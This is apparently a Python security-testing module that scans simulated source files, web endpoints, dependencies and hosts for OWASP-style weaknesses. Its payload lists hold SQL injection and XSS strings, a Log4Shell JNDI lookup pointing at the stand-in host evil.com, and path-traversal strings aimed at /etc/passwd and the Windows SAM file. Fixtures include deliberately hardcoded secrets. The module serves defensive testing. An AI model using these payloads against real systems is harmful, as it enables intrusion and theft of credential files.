"""
Vulnerability Assessment Testing

Comprehensive testing suite for vulnerability assessment including:
- Automated vulnerability scanning and assessment
- Security vulnerability testing
- Penetration testing simulation
- Common weakness enumeration (CWE) validation
- OWASP Top 10 vulnerability testing
- Dependency and third-party library security scanning

This test suite ensures the platform is protected against known security
vulnerabilities and follows secure coding practices.
"""

import json
import pytest
import hashlib
import re
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Set, Union, Any
from unittest.mock import Mock, patch, MagicMock
from dataclasses import dataclass, field
from enum import Enum
import logging
import subprocess
import socket

import polars as pl
import numpy as np
from loguru import logger


class VulnerabilityCategory(Enum):
    """Vulnerability categories."""
    INJECTION = "injection"
    BROKEN_AUTHENTICATION = "broken_authentication"
    SENSITIVE_DATA_EXPOSURE = "sensitive_data_exposure"
    XML_EXTERNAL_ENTITIES = "xml_external_entities"
    BROKEN_ACCESS_CONTROL = "broken_access_control"
    SECURITY_MISCONFIGURATION = "security_misconfiguration"
    CROSS_SITE_SCRIPTING = "cross_site_scripting"
    INSECURE_DESERIALIZATION = "insecure_deserialization"
    KNOWN_VULNERABILITIES = "known_vulnerabilities"
    INSUFFICIENT_LOGGING = "insufficient_logging"


class VulnerabilitySeverity(Enum):
    """Vulnerability severity levels."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class CVSSVector(Enum):
    """CVSS v3.1 vector components."""
    ATTACK_VECTOR_NETWORK = "AV:N"
    ATTACK_VECTOR_ADJACENT = "AV:A"
    ATTACK_VECTOR_LOCAL = "AV:L"
    ATTACK_VECTOR_PHYSICAL = "AV:P"
    ATTACK_COMPLEXITY_LOW = "AC:L"
    ATTACK_COMPLEXITY_HIGH = "AC:H"
    PRIVILEGES_REQUIRED_NONE = "PR:N"
    PRIVILEGES_REQUIRED_LOW = "PR:L"
    PRIVILEGES_REQUIRED_HIGH = "PR:H"
    USER_INTERACTION_NONE = "UI:N"
    USER_INTERACTION_REQUIRED = "UI:R"


@dataclass
class Vulnerability:
    """Security vulnerability."""
    vulnerability_id: str
    name: str
    description: str
    category: VulnerabilityCategory
    severity: VulnerabilitySeverity
    cvss_score: float
    cvss_vector: str
    cwe_id: Optional[str]
    cve_id: Optional[str]
    affected_components: List[str]
    affected_endpoints: List[str]
    exploit_difficulty: str  # "trivial", "easy", "medium", "hard"
    remediation_effort: str  # "low", "medium", "high"
    remediation_guidance: str
    references: List[str]
    discovered_date: str
    status: str  # "open", "confirmed", "false_positive", "fixed", "accepted"
    evidence: Dict[str, Any]


@dataclass
class DependencyVulnerability:
    """Third-party dependency vulnerability."""
    package_name: str
    package_version: str
    vulnerability_id: str
    severity: VulnerabilitySeverity
    cvss_score: float
    cve_id: Optional[str]
    description: str
    affected_versions: List[str]
    fixed_versions: List[str]
    patch_available: bool
    exploit_public: bool
    remediation_priority: str
    library_type: str  # "direct", "transitive"


@dataclass
class SecurityTest:
    """Security test case."""
    test_id: str
    test_name: str
    test_category: VulnerabilityCategory
    target_endpoint: str
    test_payload: str
    expected_secure_response: str
    actual_response: str
    vulnerable: bool
    confidence_level: float
    remediation_suggestion: str


@dataclass
class VulnerabilityAssessment:
    """Comprehensive vulnerability assessment results."""
    assessment_id: str
    assessment_date: str
    scan_duration_minutes: int
    vulnerabilities_found: List[Vulnerability]
    dependency_vulnerabilities: List[DependencyVulnerability]
    security_tests_performed: List[SecurityTest]
    overall_risk_score: float
    risk_level: str
    compliance_impact: str
    remediation_priorities: List[str]
    executive_summary: str
    technical_details: Dict[str, Any]


class VulnerabilityAssessmentTester:
    """Vulnerability assessment and security testing."""
    
    def __init__(self):
        """Initialise vulnerability assessment tester."""
        self.logger = logger.bind(component="vulnerability_assessment_tester")
        
        # OWASP Top 10 2021 vulnerability patterns
        self.owasp_top10_patterns = {
            VulnerabilityCategory.BROKEN_ACCESS_CONTROL: [
                {"pattern": r"\.\.\/", "description": "Path traversal attempt"},
                {"pattern": r"admin.*bypass", "description": "Admin bypass attempt"},
                {"pattern": r"uid=0", "description": "Privilege escalation attempt"}
            ],
            VulnerabilityCategory.INJECTION: [
                {"pattern": r"(union|select|insert|delete|drop).*from", "description": "SQL injection pattern"},
                {"pattern": r"<script[^>]*>.*</script>", "description": "XSS script injection"},
                {"pattern": r"eval\(|exec\(|system\(", "description": "Code injection pattern"}
            ],
            VulnerabilityCategory.SENSITIVE_DATA_EXPOSURE: [
                {"pattern": r"password.*=.*[\"'][^\"']{1,20}[\"']", "description": "Hardcoded password"},
                {"pattern": r"api[_-]?key.*=.*[\"'][^\"']{10,}[\"']", "description": "Hardcoded API key"},
                {"pattern": r"secret.*=.*[\"'][^\"']{10,}[\"']", "description": "Hardcoded secret"}
            ],
            VulnerabilityCategory.SECURITY_MISCONFIGURATION: [
                {"pattern": r"debug.*=.*true", "description": "Debug mode enabled"},
                {"pattern": r"cors.*=.*\*", "description": "Overly permissive CORS"},
                {"pattern": r"ssl.*=.*false", "description": "SSL disabled"}
            ]
        }
        
        # Common vulnerability test payloads
        self.test_payloads = {
            VulnerabilityCategory.INJECTION: [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "<script>alert('XSS')</script>",
                "${jndi:ldap://evil.com/exploit}",
                "{{7*7}}",
                "../../../etc/passwd"
            ],
            VulnerabilityCategory.CROSS_SITE_SCRIPTING: [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "';alert('XSS');//"
            ],
            VulnerabilityCategory.BROKEN_ACCESS_CONTROL: [
                "../../../etc/passwd",
                "../../windows/system32/config/sam",
                "/admin/users",
                "/api/v1/admin/",
                "?user_id=../../admin"
            ]
        }
        
        # Known vulnerable dependencies (examples)
        self.known_vulnerable_dependencies = {
            "log4j": {
                "vulnerable_versions": ["2.0", "2.14.1"],
                "cve": "CVE-2021-44228",
                "severity": VulnerabilitySeverity.CRITICAL,
                "cvss_score": 10.0,
                "description": "Log4Shell - Remote Code Execution"
            },
            "jackson-databind": {
                "vulnerable_versions": ["2.9.0", "2.9.10"],
                "cve": "CVE-2019-12384",
                "severity": VulnerabilitySeverity.HIGH,
                "cvss_score": 7.5,
                "description": "Deserialization vulnerability"
            },
            "spring-security": {
                "vulnerable_versions": ["5.0.0", "5.6.0"],
                "cve": "CVE-2022-22965",
                "severity": VulnerabilitySeverity.CRITICAL,
                "cvss_score": 9.8,
                "description": "Spring4Shell - Remote Code Execution"
            }
        }
        
        # Security headers that should be present
        self.required_security_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Content-Security-Policy": "default-src 'self'",
            "Referrer-Policy": "strict-origin-when-cross-origin"
        }
        
        # CVSS scoring thresholds
        self.cvss_thresholds = {
            VulnerabilitySeverity.CRITICAL: 9.0,
            VulnerabilitySeverity.HIGH: 7.0,
            VulnerabilitySeverity.MEDIUM: 4.0,
            VulnerabilitySeverity.LOW: 0.1
        }
    
    def scan_for_code_vulnerabilities(self, source_code_paths: List[str]) -> List[Vulnerability]:
        """
        Scan source code for security vulnerabilities.
        
        Args:
            source_code_paths: Paths to source code files to scan
            
        Returns:
            List of vulnerabilities found in source code
        """
        vulnerabilities = []
        
        for file_path in source_code_paths:
            try:
                # Read file content (simulated - in real implementation would read actual files)
                file_content = self._read_file_content(file_path)
                
                # Scan for vulnerability patterns
                for category, patterns in self.owasp_top10_patterns.items():
                    for pattern_info in patterns:
                        pattern = pattern_info["pattern"]
                        description = pattern_info["description"]
                        
                        matches = re.finditer(pattern, file_content, re.IGNORECASE)
                        for match in matches:
                            vulnerability_id = f"CODE_{len(vulnerabilities) + 1:04d}"
                            
                            vulnerabilities.append(Vulnerability(
                                vulnerability_id=vulnerability_id,
                                name=f"Code Vulnerability: {description}",
                                description=f"Potentially vulnerable code pattern detected: {description}",
                                category=category,
                                severity=self._determine_severity_from_category(category),
                                cvss_score=self._calculate_cvss_score(category),
                                cvss_vector=self._generate_cvss_vector(category),
                                cwe_id=self._get_cwe_for_category(category),
                                cve_id=None,
                                affected_components=[file_path],
                                affected_endpoints=[],
                                exploit_difficulty=self._get_exploit_difficulty(category),
                                remediation_effort=self._get_remediation_effort(category),
                                remediation_guidance=self._get_remediation_guidance(category),
                                references=self._get_references_for_category(category),
                                discovered_date=datetime.now().isoformat(),
                                status="open",
                                evidence={
                                    "file_path": file_path,
                                    "line_number": file_content[:match.start()].count('\n') + 1,
                                    "matched_text": match.group(),
                                    "pattern": pattern
                                }
                            ))
            
            except Exception as e:
                self.logger.warning(f"Failed to scan file {file_path}: {str(e)}")
        
        return vulnerabilities
    
    def test_web_application_security(self, base_urls: List[str]) -> List[SecurityTest]:
        """
        Test web application security using common attack vectors.
        
        Args:
            base_urls: Base URLs to test
            
        Returns:
            List of security test results
        """
        security_tests = []
        
        for base_url in base_urls:
            # Test for injection vulnerabilities
            for payload in self.test_payloads[VulnerabilityCategory.INJECTION]:
                test_id = f"WEB_{len(security_tests) + 1:04d}"
                
                # Simulate testing various endpoints with payloads
                test_endpoints = [
                    f"{base_url}/api/search",
                    f"{base_url}/api/users",
                    f"{base_url}/login"
                ]
                
                for endpoint in test_endpoints:
                    # Simulate HTTP request with payload (in real implementation, would make actual requests)
                    test_url = f"{endpoint}?q={payload}"
                    response = self._simulate_http_request(test_url, payload)
                    
                    # Analyse response for vulnerability indicators
                    vulnerable = self._analyse_response_for_vulnerability(response, payload)
                    
                    security_tests.append(SecurityTest(
                        test_id=test_id,
                        test_name=f"Injection Test: {payload[:20]}...",
                        test_category=VulnerabilityCategory.INJECTION,
                        target_endpoint=endpoint,
                        test_payload=payload,
                        expected_secure_response="Input sanitised/rejected",
                        actual_response=response.get("body", "")[:100],
                        vulnerable=vulnerable,
                        confidence_level=0.8 if vulnerable else 0.9,
                        remediation_suggestion="Implement input validation and parameterised queries"
                    ))
            
            # Test for XSS vulnerabilities
            for payload in self.test_payloads[VulnerabilityCategory.CROSS_SITE_SCRIPTING]:
                test_id = f"XSS_{len(security_tests) + 1:04d}"
                endpoint = f"{base_url}/search"
                
                response = self._simulate_http_request(endpoint, payload)
                vulnerable = payload in response.get("body", "")
                
                security_tests.append(SecurityTest(
                    test_id=test_id,
                    test_name=f"XSS Test: {payload[:20]}...",
                    test_category=VulnerabilityCategory.CROSS_SITE_SCRIPTING,
                    target_endpoint=endpoint,
                    test_payload=payload,
                    expected_secure_response="Script tags escaped/filtered",
                    actual_response=response.get("body", "")[:100],
                    vulnerable=vulnerable,
                    confidence_level=0.9 if vulnerable else 0.8,
                    remediation_suggestion="Implement output encoding and Content Security Policy"
                ))
            
            # Test security headers
            response = self._simulate_http_request(base_url, "")
            headers = response.get("headers", {})
            
            for header_name, expected_value in self.required_security_headers.items():
                test_id = f"HDR_{len(security_tests) + 1:04d}"
                
                actual_value = headers.get(header_name, "")
                vulnerable = not actual_value or (expected_value not in actual_value)
                
                security_tests.append(SecurityTest(
                    test_id=test_id,
                    test_name=f"Security Header: {header_name}",
                    test_category=VulnerabilityCategory.SECURITY_MISCONFIGURATION,
                    target_endpoint=base_url,
                    test_payload="",
                    expected_secure_response=f"{header_name}: {expected_value}",
                    actual_response=f"{header_name}: {actual_value}" if actual_value else f"{header_name}: (missing)",
                    vulnerable=vulnerable,
                    confidence_level=0.95,
                    remediation_suggestion=f"Configure {header_name} security header with value: {expected_value}"
                ))
        
        return security_tests
    
    def scan_dependencies_for_vulnerabilities(self, dependencies: List[Dict[str, str]]) -> List[DependencyVulnerability]:
        """
        Scan dependencies for known vulnerabilities.
        
        Args:
            dependencies: List of dependencies with name and version
            
        Returns:
            List of dependency vulnerabilities
        """
        dependency_vulnerabilities = []
        
        for dependency in dependencies:
            package_name = dependency.get("name", "").lower()
            package_version = dependency.get("version", "")
            
            # Check against known vulnerable dependencies
            for vulnerable_package, vuln_info in self.known_vulnerable_dependencies.items():
                if vulnerable_package in package_name:
                    # Check if current version is vulnerable
                    vulnerable_versions = vuln_info["vulnerable_versions"]
                    
                    if any(self._version_matches(package_version, vuln_version) for vuln_version in vulnerable_versions):
                        dependency_vulnerabilities.append(DependencyVulnerability(
                            package_name=package_name,
                            package_version=package_version,
                            vulnerability_id=f"DEP_{len(dependency_vulnerabilities) + 1:04d}",
                            severity=vuln_info["severity"],
                            cvss_score=vuln_info["cvss_score"],
                            cve_id=vuln_info["cve"],
                            description=vuln_info["description"],
                            affected_versions=vulnerable_versions,
                            fixed_versions=self._get_fixed_versions(vulnerable_package),
                            patch_available=True,
                            exploit_public=True,
                            remediation_priority="high" if vuln_info["severity"] in [VulnerabilitySeverity.CRITICAL, VulnerabilitySeverity.HIGH] else "medium",
                            library_type=dependency.get("type", "direct")
                        ))
        
        return dependency_vulnerabilities
    
    def test_network_security(self, target_hosts: List[str]) -> List[Vulnerability]:
        """
        Test network security configuration.
        
        Args:
            target_hosts: List of hosts to test
            
        Returns:
            List of network security vulnerabilities
        """
        network_vulnerabilities = []
        
        for host in target_hosts:
            # Test for open ports (simulated)
            open_ports = self._simulate_port_scan(host)
            
            for port, service in open_ports.items():
                # Check for unnecessary open ports
                if port not in [80, 443, 22]:  # Common necessary ports
                    vulnerability_id = f"NET_{len(network_vulnerabilities) + 1:04d}"
                    
                    network_vulnerabilities.append(Vulnerability(
                        vulnerability_id=vulnerability_id,
                        name=f"Unnecessary Open Port: {port}",
                        description=f"Port {port} ({service}) is open and may not be necessary",
                        category=VulnerabilityCategory.SECURITY_MISCONFIGURATION,
                        severity=VulnerabilitySeverity.MEDIUM,
                        cvss_score=5.3,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                        cwe_id="CWE-200",
                        cve_id=None,
                        affected_components=[host],
                        affected_endpoints=[f"{host}:{port}"],
                        exploit_difficulty="easy",
                        remediation_effort="low",
                        remediation_guidance=f"Close port {port} if not required or implement firewall rules",
                        references=["https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration"],
                        discovered_date=datetime.now().isoformat(),
                        status="open",
                        evidence={
                            "host": host,
                            "port": port,
                            "service": service,
                            "scan_method": "simulated_port_scan"
                        }
                    ))
            
            # Test SSL/TLS configuration
            ssl_issues = self._test_ssl_configuration(host)
            for issue in ssl_issues:
                vulnerability_id = f"SSL_{len(network_vulnerabilities) + 1:04d}"
                
                network_vulnerabilities.append(Vulnerability(
                    vulnerability_id=vulnerability_id,
                    name=f"SSL/TLS Issue: {issue['name']}",
                    description=issue["description"],
                    category=VulnerabilityCategory.SECURITY_MISCONFIGURATION,
                    severity=issue["severity"],
                    cvss_score=issue["cvss_score"],
                    cvss_vector=issue["cvss_vector"],
                    cwe_id="CWE-326",
                    cve_id=None,
                    affected_components=[host],
                    affected_endpoints=[f"https://{host}"],
                    exploit_difficulty=issue["exploit_difficulty"],
                    remediation_effort="medium",
                    remediation_guidance=issue["remediation"],
                    references=["https://owasp.org/www-community/Transport_Layer_Protection_Cheat_Sheet"],
                    discovered_date=datetime.now().isoformat(),
                    status="open",
                    evidence=issue["evidence"]
                ))
        
        return network_vulnerabilities
    
    def conduct_comprehensive_vulnerability_assessment(self, 
                                                     source_code_paths: List[str],
                                                     web_application_urls: List[str],
                                                     dependencies: List[Dict[str, str]],
                                                     network_targets: List[str]) -> VulnerabilityAssessment:
        """
        Conduct comprehensive vulnerability assessment.
        
        Args:
            source_code_paths: Source code files to scan
            web_application_urls: Web application URLs to test
            dependencies: Dependencies to check for vulnerabilities
            network_targets: Network hosts to test
            
        Returns:
            Comprehensive vulnerability assessment results
        """
        assessment_id = f"vuln_assessment_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        start_time = datetime.now()
        
        # Perform all vulnerability scans
        code_vulnerabilities = self.scan_for_code_vulnerabilities(source_code_paths)
        web_security_tests = self.test_web_application_security(web_application_urls)
        dependency_vulnerabilities = self.scan_dependencies_for_vulnerabilities(dependencies)
        network_vulnerabilities = self.test_network_security(network_targets)
        
        # Combine all vulnerabilities
        all_vulnerabilities = code_vulnerabilities + network_vulnerabilities
        
        # Calculate overall risk score
        overall_risk_score = self._calculate_overall_risk_score(all_vulnerabilities, dependency_vulnerabilities)
        
        # Determine risk level
        risk_level = self._determine_risk_level(overall_risk_score)
        
        # Generate remediation priorities
        remediation_priorities = self._generate_remediation_priorities(all_vulnerabilities, dependency_vulnerabilities)
        
        # Generate executive summary
        executive_summary = self._generate_executive_summary(all_vulnerabilities, dependency_vulnerabilities, risk_level)
        
        # Calculate scan duration
        scan_duration = (datetime.now() - start_time).total_seconds() / 60
        
        return VulnerabilityAssessment(
            assessment_id=assessment_id,
            assessment_date=start_time.isoformat(),
            scan_duration_minutes=int(scan_duration),
            vulnerabilities_found=all_vulnerabilities,
            dependency_vulnerabilities=dependency_vulnerabilities,
            security_tests_performed=web_security_tests,
            overall_risk_score=overall_risk_score,
            risk_level=risk_level,
            compliance_impact=self._assess_compliance_impact(all_vulnerabilities),
            remediation_priorities=remediation_priorities,
            executive_summary=executive_summary,
            technical_details={
                "code_vulnerabilities": len(code_vulnerabilities),
                "network_vulnerabilities": len(network_vulnerabilities),
                "dependency_vulnerabilities": len(dependency_vulnerabilities),
                "security_tests": len(web_security_tests),
                "vulnerable_tests": len([t for t in web_security_tests if t.vulnerable]),
                "scan_scope": {
                    "source_files": len(source_code_paths),
                    "web_applications": len(web_application_urls),
                    "dependencies": len(dependencies),
                    "network_targets": len(network_targets)
                }
            }
        )
    
    def _read_file_content(self, file_path: str) -> str:
        """Simulate reading file content (placeholder implementation)."""
        # In real implementation, would read actual file content
        simulated_content = {
            "app.py": """
import sqlite3
password = "hardcoded123"
def get_user(user_id):
    query = "SELECT * FROM users WHERE id = '" + user_id + "'"
    return db.execute(query)
            """,
            "config.py": """
DEBUG = True
SECRET_KEY = "dev-secret-key-123"
API_KEY = "sk-test-123456789"
CORS_ORIGINS = "*"
            """,
            "auth.py": """
def authenticate(username, password):
    if username == "admin" and password == "admin":
        return True
    return False
            """
        }
        
        file_name = Path(file_path).name
        return simulated_content.get(file_name, "# Sample code content")
    
    def _simulate_http_request(self, url: str, payload: str) -> Dict[str, Any]:
        """Simulate HTTP request (placeholder implementation)."""
        # In real implementation, would make actual HTTP requests
        response = {
            "status_code": 200,
            "headers": {
                "Content-Type": "text/html",
                "Server": "nginx/1.18.0"
            },
            "body": f"<html><body>Search results for: {payload}</body></html>"
        }
        
        # Simulate vulnerability responses
        if "<script>" in payload:
            response["body"] = f"<html><body>Results: {payload}</body></html>"  # Vulnerable to XSS
        elif "' OR '" in payload:
            response["body"] = "Database error: syntax error"  # Potential SQL injection
        
        return response
    
    def _analyse_response_for_vulnerability(self, response: Dict[str, Any], payload: str) -> bool:
        """Analyse HTTP response for vulnerability indicators."""
        response_body = response.get("body", "")
        
        # Check for common vulnerability indicators
        vulnerability_indicators = [
            "database error",
            "mysql error",
            "postgresql error",
            "syntax error",
            "oracle error",
            "warning: mysql",
            "function.mysql",
            "Microsoft OLE DB Provider for ODBC Drivers"
        ]
        
        # Check if payload is reflected unescaped
        if payload in response_body and ("<script>" in payload or "javascript:" in payload):
            return True
        
        # Check for error-based SQL injection indicators
        if any(indicator.lower() in response_body.lower() for indicator in vulnerability_indicators):
            return True
        
        return False
    
    def _simulate_port_scan(self, host: str) -> Dict[int, str]:
        """Simulate port scan (placeholder implementation)."""
        # In real implementation, would perform actual port scanning
        simulated_results = {
            "web-server": {22: "ssh", 80: "http", 443: "https", 3306: "mysql"},
            "database-server": {22: "ssh", 3306: "mysql", 5432: "postgresql"},
            "api-server": {22: "ssh", 80: "http", 443: "https", 8080: "http-alt"}
        }
        
        # Return simulated open ports based on host type
        for server_type, ports in simulated_results.items():
            if server_type in host:
                return ports
        
        return {22: "ssh", 80: "http", 443: "https"}  # Default ports
    
    def _test_ssl_configuration(self, host: str) -> List[Dict[str, Any]]:
        """Test SSL/TLS configuration (placeholder implementation)."""
        # In real implementation, would test actual SSL configuration
        ssl_issues = []
        
        # Simulate common SSL issues
        if "legacy" in host:
            ssl_issues.append({
                "name": "Weak SSL Protocol",
                "description": "Server supports deprecated TLS 1.0 protocol",
                "severity": VulnerabilitySeverity.HIGH,
                "cvss_score": 7.4,
                "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
                "exploit_difficulty": "medium",
                "remediation": "Disable TLS 1.0 and 1.1, enable TLS 1.2+ only",
                "evidence": {"supported_protocols": ["TLS 1.0", "TLS 1.1", "TLS 1.2"]}
            })
        
        if "test" in host:
            ssl_issues.append({
                "name": "Self-Signed Certificate",
                "description": "Server uses self-signed SSL certificate",
                "severity": VulnerabilitySeverity.MEDIUM,
                "cvss_score": 5.3,
                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                "exploit_difficulty": "easy",
                "remediation": "Replace with valid certificate from trusted CA",
                "evidence": {"certificate_issuer": "self-signed", "trust_status": "untrusted"}
            })
        
        return ssl_issues
    
    def _version_matches(self, actual_version: str, vulnerable_version: str) -> bool:
        """Check if version matches vulnerability pattern."""
        # Simplified version matching - in real implementation would use proper semver
        return actual_version.startswith(vulnerable_version)
    
    def _get_fixed_versions(self, package_name: str) -> List[str]:
        """Get fixed versions for vulnerable package."""
        fixed_versions_map = {
            "log4j": ["2.15.0", "2.16.0", "2.17.0"],
            "jackson-databind": ["2.9.10.1", "2.10.0"],
            "spring-security": ["5.6.1", "5.7.0"]
        }
        return fixed_versions_map.get(package_name, ["latest"])
    
    def _determine_severity_from_category(self, category: VulnerabilityCategory) -> VulnerabilitySeverity:
        """Determine severity based on vulnerability category."""
        severity_map = {
            VulnerabilityCategory.INJECTION: VulnerabilitySeverity.HIGH,
            VulnerabilityCategory.BROKEN_AUTHENTICATION: VulnerabilitySeverity.HIGH,
            VulnerabilityCategory.SENSITIVE_DATA_EXPOSURE: VulnerabilitySeverity.CRITICAL,
            VulnerabilityCategory.BROKEN_ACCESS_CONTROL: VulnerabilitySeverity.HIGH,
            VulnerabilityCategory.SECURITY_MISCONFIGURATION: VulnerabilitySeverity.MEDIUM,
            VulnerabilityCategory.CROSS_SITE_SCRIPTING: VulnerabilitySeverity.MEDIUM,
            VulnerabilityCategory.INSECURE_DESERIALIZATION: VulnerabilitySeverity.HIGH,
            VulnerabilityCategory.KNOWN_VULNERABILITIES: VulnerabilitySeverity.HIGH,
            VulnerabilityCategory.INSUFFICIENT_LOGGING: VulnerabilitySeverity.LOW
        }
        return severity_map.get(category, VulnerabilitySeverity.MEDIUM)
    
    def _calculate_cvss_score(self, category: VulnerabilityCategory) -> float:
        """Calculate CVSS score based on category."""
        score_map = {
            VulnerabilityCategory.INJECTION: 8.1,
            VulnerabilityCategory.BROKEN_AUTHENTICATION: 7.5,
            VulnerabilityCategory.SENSITIVE_DATA_EXPOSURE: 9.1,
            VulnerabilityCategory.BROKEN_ACCESS_CONTROL: 8.2,
            VulnerabilityCategory.SECURITY_MISCONFIGURATION: 6.5,
            VulnerabilityCategory.CROSS_SITE_SCRIPTING: 6.1,
            VulnerabilityCategory.INSECURE_DESERIALIZATION: 8.1,
            VulnerabilityCategory.KNOWN_VULNERABILITIES: 7.9,
            VulnerabilityCategory.INSUFFICIENT_LOGGING: 3.3
        }
        return score_map.get(category, 5.0)
    
    def _generate_cvss_vector(self, category: VulnerabilityCategory) -> str:
        """Generate CVSS vector string based on category."""
        # Simplified CVSS vector generation
        return "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    
    def _get_cwe_for_category(self, category: VulnerabilityCategory) -> str:
        """Get CWE ID for vulnerability category."""
        cwe_map = {
            VulnerabilityCategory.INJECTION: "CWE-89",
            VulnerabilityCategory.BROKEN_AUTHENTICATION: "CWE-287",
            VulnerabilityCategory.SENSITIVE_DATA_EXPOSURE: "CWE-200",
            VulnerabilityCategory.BROKEN_ACCESS_CONTROL: "CWE-284",
            VulnerabilityCategory.SECURITY_MISCONFIGURATION: "CWE-16",
            VulnerabilityCategory.CROSS_SITE_SCRIPTING: "CWE-79",
            VulnerabilityCategory.INSECURE_DESERIALIZATION: "CWE-502",
            VulnerabilityCategory.KNOWN_VULNERABILITIES: "CWE-1035",
            VulnerabilityCategory.INSUFFICIENT_LOGGING: "CWE-778"
        }
        return cwe_map.get(category, "CWE-1000")
    
    def _get_exploit_difficulty(self, category: VulnerabilityCategory) -> str:
        """Get exploit difficulty for category."""
        difficulty_map = {
            VulnerabilityCategory.INJECTION: "easy",
            VulnerabilityCategory.CROSS_SITE_SCRIPTING: "easy",
            VulnerabilityCategory.BROKEN_ACCESS_CONTROL: "medium",
            VulnerabilityCategory.SECURITY_MISCONFIGURATION: "easy",
            VulnerabilityCategory.SENSITIVE_DATA_EXPOSURE: "trivial",
            VulnerabilityCategory.BROKEN_AUTHENTICATION: "medium",
            VulnerabilityCategory.INSECURE_DESERIALIZATION: "hard",
            VulnerabilityCategory.KNOWN_VULNERABILITIES: "medium",
            VulnerabilityCategory.INSUFFICIENT_LOGGING: "trivial"
        }
        return difficulty_map.get(category, "medium")
    
    def _get_remediation_effort(self, category: VulnerabilityCategory) -> str:
        """Get remediation effort for category."""
        effort_map = {
            VulnerabilityCategory.INJECTION: "medium",
            VulnerabilityCategory.CROSS_SITE_SCRIPTING: "low",
            VulnerabilityCategory.BROKEN_ACCESS_CONTROL: "high",
            VulnerabilityCategory.SECURITY_MISCONFIGURATION: "low",
            VulnerabilityCategory.SENSITIVE_DATA_EXPOSURE: "medium",
            VulnerabilityCategory.BROKEN_AUTHENTICATION: "high",
            VulnerabilityCategory.INSECURE_DESERIALIZATION: "high",
            VulnerabilityCategory.KNOWN_VULNERABILITIES: "low",
            VulnerabilityCategory.INSUFFICIENT_LOGGING: "low"
        }
        return effort_map.get(category, "medium")
    
    def _get_remediation_guidance(self, category: VulnerabilityCategory) -> str:
        """Get remediation guidance for category."""
        guidance_map = {
            VulnerabilityCategory.INJECTION: "Use parameterised queries and input validation",
            VulnerabilityCategory.CROSS_SITE_SCRIPTING: "Implement output encoding and CSP",
            VulnerabilityCategory.BROKEN_ACCESS_CONTROL: "Implement proper authorisation checks",
            VulnerabilityCategory.SECURITY_MISCONFIGURATION: "Follow security configuration guidelines",
            VulnerabilityCategory.SENSITIVE_DATA_EXPOSURE: "Encrypt sensitive data and remove hardcoded secrets",
            VulnerabilityCategory.BROKEN_AUTHENTICATION: "Implement strong authentication mechanisms",
            VulnerabilityCategory.INSECURE_DESERIALIZATION: "Avoid deserialisation of untrusted data",
            VulnerabilityCategory.KNOWN_VULNERABILITIES: "Update to patched versions",
            VulnerabilityCategory.INSUFFICIENT_LOGGING: "Implement comprehensive logging and monitoring"
        }
        return guidance_map.get(category, "Follow security best practices")
    
    def _get_references_for_category(self, category: VulnerabilityCategory) -> List[str]:
        """Get reference URLs for category."""
        return [
            "https://owasp.org/www-project-top-ten/",
            f"https://cwe.mitre.org/data/definitions/{self._get_cwe_for_category(category).split('-')[1]}.html"
        ]
    
    def _calculate_overall_risk_score(self, vulnerabilities: List[Vulnerability], dependency_vulns: List[DependencyVulnerability]) -> float:
        """Calculate overall risk score."""
        if not vulnerabilities and not dependency_vulns:
            return 0.0
        
        # Weight vulnerabilities by severity
        total_score = 0.0
        total_weight = 0.0
        
        for vuln in vulnerabilities:
            weight = self._get_severity_weight(vuln.severity)
            total_score += vuln.cvss_score * weight
            total_weight += weight
        
        for dep_vuln in dependency_vulns:
            weight = self._get_severity_weight(dep_vuln.severity)
            total_score += dep_vuln.cvss_score * weight
            total_weight += weight
        
        return total_score / total_weight if total_weight > 0 else 0.0
    
    def _get_severity_weight(self, severity: VulnerabilitySeverity) -> float:
        """Get weight multiplier for severity."""
        weights = {
            VulnerabilitySeverity.CRITICAL: 4.0,
            VulnerabilitySeverity.HIGH: 3.0,
            VulnerabilitySeverity.MEDIUM: 2.0,
            VulnerabilitySeverity.LOW: 1.0,
            VulnerabilitySeverity.INFO: 0.5
        }
        return weights.get(severity, 1.0)
    
    def _determine_risk_level(self, risk_score: float) -> str:
        """Determine risk level from score."""
        if risk_score >= 9.0:
            return "critical"
        elif risk_score >= 7.0:
            return "high"
        elif risk_score >= 4.0:
            return "medium"
        elif risk_score >= 1.0:
            return "low"
        else:
            return "minimal"
    
    def _generate_remediation_priorities(self, vulnerabilities: List[Vulnerability], dependency_vulns: List[DependencyVulnerability]) -> List[str]:
        """Generate prioritised remediation recommendations."""
        priorities = []
        
        # Critical vulnerabilities first
        critical_vulns = [v for v in vulnerabilities if v.severity == VulnerabilitySeverity.CRITICAL]
        critical_deps = [v for v in dependency_vulns if v.severity == VulnerabilitySeverity.CRITICAL]
        
        if critical_vulns or critical_deps:
            priorities.append("URGENT: Address all critical vulnerabilities immediately")
        
        # High-impact categories
        injection_vulns = [v for v in vulnerabilities if v.category == VulnerabilityCategory.INJECTION]
        if injection_vulns:
            priorities.append("High Priority: Fix injection vulnerabilities to prevent data breaches")
        
        auth_vulns = [v for v in vulnerabilities if v.category == VulnerabilityCategory.BROKEN_AUTHENTICATION]
        if auth_vulns:
            priorities.append("High Priority: Strengthen authentication mechanisms")
        
        # Dependency updates
        if dependency_vulns:
            priorities.append("Medium Priority: Update vulnerable dependencies")
        
        # Configuration issues
        config_vulns = [v for v in vulnerabilities if v.category == VulnerabilityCategory.SECURITY_MISCONFIGURATION]
        if config_vulns:
            priorities.append("Medium Priority: Fix security misconfigurations")
        
        return priorities
    
